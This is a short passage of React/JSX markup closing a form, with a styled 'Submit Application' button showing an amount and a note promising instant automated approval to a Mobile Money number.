                  className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2 cursor-pointer border border-[#006591]/40"
                >
                  <span>Submit Application ({formattedAmountDisplay})</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>

              <div className="flex items-center justify-center gap-1.5 text-[11px] text-gray-500 text-center">
                <ShieldCheck className="w-3.5 h-3.5 text-green-600 shrink-0" />
                <span>Instant automated approval directly to your Mobile Money number.</span>
              </div>
            </form>
          </div>
        </main>
      </div>
    </PageLoader>
  );
}
